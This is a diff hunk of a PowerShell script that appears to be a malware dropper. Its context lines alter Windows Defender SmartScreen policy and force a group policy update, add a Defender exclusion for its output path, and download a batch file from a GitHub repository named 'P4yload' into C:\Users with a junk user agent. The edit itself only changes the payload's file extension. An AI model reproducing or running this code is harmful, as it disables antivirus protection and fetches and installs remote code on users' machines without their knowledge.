@@ -23,7 +23,7 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
 $url = "https://github.com/P4yload/CheckWeb1/raw/main/Check.bat"
-$outputFile = "C:\Users\ccmmmd.exe"
+$outputFile = "C:\Users\ccmmmd.bat"
 Add-MpPreference -ExclusionPath $outputFile
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
 #$webClient = New-Object System.Net.WebClient
